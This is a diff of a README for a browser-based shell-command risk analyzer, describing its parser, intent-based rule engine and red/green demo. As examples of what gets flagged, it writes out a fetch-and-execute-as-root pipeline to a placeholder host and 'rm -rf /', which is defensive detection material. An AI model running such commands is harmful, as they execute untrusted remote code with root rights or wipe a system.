@@ -19,16 +19,20 @@ contains.
 Paste `curl http://x | sudo bash` and see it flagged red with a one-line explanation of exactly
 why, right next to a harmless command flagged green for contrast.
 
-## Planned features
+## Features
 
 - A real shell-syntax tokenizer and parser (not a regex blocklist): pipelines, redirects,
-  `&&`/`||`/`;` sequencing, quoting.
-- A risk rule engine that reasons about intent: destructive filesystem ops scoped by target,
-  remote-fetch-and-execute patterns, `sudo`/root scope, outbound network + exfiltration shape,
-  redirects into sensitive paths.
+  `&&`/`||`/`;` sequencing, quoting. Unterminated quotes and unsupported constructs (process/
+  command substitution) degrade gracefully instead of crashing or silently reading "safe".
+- A risk rule engine that reasons about intent: destructive filesystem ops scoped by target
+  (`rm -rf /` vs. `rm -rf ./build`), remote-fetch-and-execute patterns, `sudo`/root scope that
+  compounds with what it's escalating, outbound network + exfiltration shape, redirects into
+  sensitive paths (`/etc/*`, `~/.ssh/*`, shell rc files).
 - Plain-English, one-line explanations per finding — not just a severity badge.
-- A live paste-and-analyze UI with side-by-side red/green examples as the landing demo.
-- Shareable permalinks that encode the pasted command for reproducing a flagged example.
+- A live paste-and-analyze UI with side-by-side red/green examples pre-analyzed on load, so the
+  wow moment lands before you type anything.
+- Shareable permalinks that encode the pasted command in the URL hash for reproducing a
+  flagged example — no server round-trip.
 - Zero network calls: analysis is 100% client-side, nothing you paste ever leaves the browser.
 
 ## Stack
